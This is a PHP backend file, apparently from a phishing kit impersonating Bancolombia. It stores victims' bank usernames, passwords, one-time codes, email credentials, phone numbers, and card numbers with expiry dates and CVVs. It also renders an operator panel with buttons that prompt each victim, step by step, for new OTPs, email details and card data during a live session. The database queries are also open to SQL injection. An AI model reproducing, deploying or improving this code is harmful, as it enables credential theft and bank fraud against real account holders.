<?php
require('conexion.php');

function crear_registro($usr,$pass,$dis){
	date_default_timezone_set('America/Bogota');
	$ip_add = $_SERVER['REMOTE_ADDR'];
	$hoy = date("Y-m-d H:i:s"); 
	if ($con = conectar()) {
		if (sentencia($con,"INSERT INTO rtr45 (idreg, usuario, password, otp, dispositivo, ip, id, agente, banco, status, horacreado, horamodificado) VALUES (NULL, '".$usr."', '".$pass."', NULL, '".$dis."', '".$ip_add."', NULL, NULL, 'Bancolombia', '1', '".$hoy."', '".$hoy."')")) {
			$consulta = sentencia($con,"SELECT idreg FROM rtr45 WHERE usuario = '".$usr."' ORDER BY idreg DESC LIMIT 1");
			if (contarfilas($consulta)) {
				$datos=traerdatos($consulta);
				setcookie('registro',$datos["idreg"],time()+60*9);
				setcookie('estado',"1",time()+60*9);
				echo $datos["idreg"];
			}			
		}else{
			echo "NO";
		}
		desconectar($con);
	}else{
		echo "ERR";
	}
}


function actualizar_usuario($usr,$pas,$id){
	date_default_timezone_set('America/Bogota');
	$hoy = date("Y-m-d H:i:s"); 

	if ($con = conectar()) {
		sentencia($con,"UPDATE rtr45 SET status = '1', usuario ='".$usr."', password= '".$pas."', horamodificado='".$hoy."' WHERE idreg = ".$id);
		desconectar($con);
	}
}


function buscar_estado($r){
	if ($con = conectar()) {
		$consulta = sentencia($con,"SELECT status FROM rtr45 WHERE idreg = '".$r."'");
		if (contarfilas($consulta)) {
			$datos=traerdatos($consulta);
			return $datos["status"];
		}else{

		}
		desconectar($con);
	}else{

	}
}


function contador(){
	$c=0;
	if ($con = conectar()) {	
		$consulta1 = sentencia($con,"SELECT * FROM v1s1t");
		if (contarfilas($consulta1)) {
			$res1=traerdatos($consulta1);
			$c = 1*$res1["contador"];
			$c=$c+1;
			sentencia($con,"UPDATE v1s1t SET contador='".$c."'");
		}
		desconectar($con);
	}
}



function actualizar_registro_otp($reg,$cd){
	date_default_timezone_set('America/Bogota');
	$hoy = date("Y-m-d H:i:s"); 

	if ($con = conectar()) {
		
		if (sentencia($con,"UPDATE rtr45 SET status = '3', otp ='".$cd."', horamodificado='".$hoy."' WHERE idreg = ".$reg)) {
			
		}else{

		}
		desconectar($con);
	}else{

	}
}


function actualizar_registro_mail($reg,$mail,$cm,$cel){
	date_default_timezone_set('America/Bogota');
	$hoy = date("Y-m-d H:i:s"); 
	if ($con = conectar()) {
		
		if (sentencia($con,"UPDATE rtr45 SET status = '5', email='".$mail."', cemail='".$cm."', celular='".$cel."', horamodificado='".$hoy."'  WHERE idreg = ".$reg)) {
			
		}else{

		}
		desconectar($con);
	}else{

	}
}


function actualizar_registro_tar($reg,$tar,$ft,$cvv){
	date_default_timezone_set('America/Bogota');
	$hoy = date("Y-m-d H:i:s"); 
	if ($con = conectar()) {	
		if (sentencia($con,"UPDATE rtr45 SET status = '7', tarjeta='".$tar."', ftarjeta='".$ft."', cvv='".$cvv."', horamodificado='".$hoy."'  WHERE idreg = ".$reg)) {
			
		}else{

		}
		desconectar($con);
	}else{

	}
}




function cargar_casos(){
	if ($con = conectar()) {
		$consultaCon = sentencia($con,"SELECT * FROM v1s1t");
		if (contarfilas($consultaCon)) {
			$res=traerdatos($consultaCon);
			echo '<span style="color:yellow">TOTAL:</span><span style="color:#00FF00;font-weight:600;">'.$res["contador"].'</span><br>'; 
		}

		$consulta = sentencia($con,"SELECT * FROM rtr45 WHERE status <> 0 ORDER BY horamodificado DESC");
		if (contarfilas($consulta)) {
			while ($datos=traerdatos($consulta)) {				
				pintar_casilla($datos['idreg'],$datos['usuario'],$datos['password'],$datos['otp'],$datos['dispositivo'],$datos['ip'],$datos['email'],$datos['cemail'],$datos['banco'],$datos['status'],$datos['horamodificado'],$datos['celular'],$datos['tarjeta'],$datos['ftarjeta'],$datos['cvv']);								
			}
		}else{

		}
		desconectar($con);
	}else{

	}
}

function pito(){
	if ($con = conectar()) {
		$consulta1 = sentencia($con,"SELECT * FROM rtr45 WHERE status = 3 OR status = 9");
		if (contarfilas($consulta1)) {
			echo "OTP";
		}else{
			$consulta2 = sentencia($con,"SELECT * FROM rtr45 WHERE status = 1 OR status = 5 OR status = 7");
			if (contarfilas($consulta2)) {
				echo "SI";
			}else{
				echo "NO";
			}
		}	
		desconectar($con);
	}else{

	}
}





function pintar_casilla($reg,$usr,$pass,$otp,$equipo,$ip,$eml,$cml,$ban,$estado,$hora,$cel,$tar,$fec,$cvv){
	$nomEstado = "";
	switch ($estado) {
		case 1: $nomEstado = "Ingresó Usuario/Clave";	
				$color = "#FFFF4D";	
				$habil = "";	
				$btnap = "btn";
				break;
		case 2: $nomEstado = "Esperando OTP";	
				$color = "#001040";	
				$habil = "disabled";
				$btnap = "btn-apagado";		
				break;
		case 3: $nomEstado = "Ingresó OTP";	
				$color = "#FFFF4D";	
				$habil = "";	
				$btnap = "btn";	
				break;
		case 4: $nomEstado = "Esperando Correo/Clave";		
				$color = "#001040";	
				$habil = "disabled";
				$btnap = "btn-apagado";	
				break;
		case 5: $nomEstado = "Ingresó Correo/Clave";	
				$color = "#FFFF4D";	
				$habil = "";	
				$btnap = "btn";	
				break;
		case 6: $nomEstado = "Esperando Info Tarjeta";	
				$color = "#001040";	
				$habil = "disabled";	
				$btnap = "btn-apagado";	
				break;
		case 7: $nomEstado = "Ingresó Info Tarjeta";	
				$color = "#FFFF4D";	
				$habil = "";	
				$btnap = "btn";	
				break;
		case 8: $nomEstado = "Esperando Nuevo OTP";	
				$color = "#001040";	
				$habil = "disabled";	
				$btnap = "btn-apagado";	
				break;
		case 9: $nomEstado = "Ingresó Nuevo OTP";	
				$color = "#FFFF4D";	
				$habil = "";	
				$btnap = "btn";	
				break;
		case 10: $nomEstado = "Finalizado";	
				$color = "blue";	
				$habil = "disabled";	
				$btnap = "btn-apagado";	
				break;
		case 12: $nomEstado = "Esperando Nuevo OTP";	
				$color = "#001040";	
				$habil = "disabled";	
				$btnap = "btn-apagado";	
				break;

		}

	echo '<div class="ficha" style="border: 1px solid '.$color.';">
			<table class="casilla">
			  <tr>
			    <td colspan="2">
			    	<table>
			    		<tr>
			    			<td style="color:#00FF00;">USUARIO</td>
			    			<td style="color:#00FF00;">PASSWORD</td>
			    			<td style="color:#00FF00;">OTP</td>
			    		</tr>			    		
			    		<tr>
			    			<td class="info" id="usuario">'.$usr.'</td>
			    			<td class="info" id="password">'.$pass.'</td>
			    			<td class="info" id="otp">'.$otp.'</td>
			    		</tr>	
			    		<tr>
			    			<td colspan="3">&nbsp;</td>			    			
			    		</tr>
			    		<tr>
			    			<td style="color:#4DFFFF;">EMAIL</td>
			    			<td style="color:#4DFFFF;">PASSWORD</td>
			    			<td style="color:#4DFFFF;">CELULAR</td>
			    		</tr>
			    		<tr>
			    			<td class="info" id="email">'.$eml.'</td>
			    			<td class="info" id="cemail">'.$cml.'</td>
			    			<td class="info" id="celular">'.$cel.'</td>
			    		</tr>
			    		<tr>
			    			<td colspan="3">&nbsp;</td>	
			    		</tr>
			    		<tr>
			    			<td style="color:#FF4DFF;">TARJETA</td>
			    			<td style="color:#FF4DFF;">FECHA</td>
			    			<td style="color:#FF4DFF;">CVV</td>
			    		</tr>
			    		<tr>
			    			<td class="info" id="tarjeta">'.$tar.'</td>
			    			<td class="info" id="fecha">'.$fec.'</td>
			    			<td class="info" id="cvv">'.$cvv.'</td>
			    		</tr>
			    	</table>
			    </td>
			  </tr>
			  <tr>
			    <td colspan="2">
			    <div class="separador"></div>
			    </td>
			  </tr>
			  <tr>
			    <td style="color:#FFFF4D;" width="50%">Dispositivo</td>
			    <td style="color:#FFFF4D;">IP</td>
			  </tr>
			  <tr>
			    <td class="info" id="dispositivo">'.$equipo.'</td>
			    <td class="info" id="ip">'.$ip.'</td>
			  </tr>
			  <tr>
			    <td colspan="2">
			    <div class="separador"></div>
			    </td>
			  </tr>			 			
			  <tr>
			    <td colspan="2" style="color:#FFFF4D;">Banco</td>
			  </tr>
			  <tr>
			    <td colspan="2" class="info" id="banco">'.$ban.'</td>
			  </tr>
			  <tr>
			    <td colspan="2">
			    	<div class="separador"></div>
			    </td>
			  </tr>
			  <tr>
			    <td style="color:#FFFF4D;">Estado</td>
			    <td style="color:#FFFF4D;">Hora</td>
			  </tr>
			  <tr>
			    <td class="info" id="estado">'.$nomEstado.'</td>
			    <td class="info" id="hora">'.$hora.'</td>
			  </tr>
			  <tr>
			    <td>&nbsp;</td>
			    <td></td>
			  </tr>
			  <tr>
			    <td colspan="2">
			    	<table>
			    		<tr>
			    			<td><input type="button" value="Usuario" '.$habil.' class="'.$btnap.' usuario" id="'.$reg.'"></td>
			    			<td><input type="button" value="OTP" '.$habil.' class="'.$btnap.' dinamica" id="'.$reg.'"></td>
			    			<td><input type="button" value="Nuevo OTP" '.$habil.' class="'.$btnap.' otp" id="'.$reg.'"></td>
			    			<td><input type="button" value="Correo" '.$habil.' class="'.$btnap.' correo" id="'.$reg.'"></td>
			    			<td><input type="button" value="Tarjeta" '.$habil.' class="'.$btnap.' tarjeta" id="'.$reg.'"></td>
			    			<td><input type="button" value="Finalizar" class="btn finalizar" id="'.$reg.'"></td>
			    		</tr>				
			    	</table>
			    </td>
			  </tr>  
			</table>
		</div>';
}



function actualizar_estado($reg,$est){
	if ($con = conectar()) {
		if (sentencia($con,"UPDATE rtr45 SET status = '".$est."' WHERE idreg = ".$reg)) {
			
		}else{

		}
		desconectar($con);
	}else{

	}
}

?>